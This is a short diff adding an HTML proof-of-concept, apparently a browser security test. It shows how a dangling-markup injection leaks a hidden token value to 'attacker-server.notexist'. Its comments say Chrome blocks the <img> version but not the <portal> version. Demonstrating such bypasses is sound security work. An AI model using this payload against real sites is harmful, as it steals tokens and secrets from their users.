@@ -1,0 +1,16 @@
+<!doctype html><meta charset=utf-8>
+
+<!-- The following request will get blocked by Chrome...  -->
+
+<img src='https://attacker-server.notexist?
+
+<input token="magic_value_1234" type='hidden'>
+
+
+<!-- ... but that won't happen with the <portal> tag, 
+     and the data will go to the external server.  -->
+
+<portal src='https://attacker-server.notexist?
+
+<input token="magic_value_1234" type='hidden'>
+
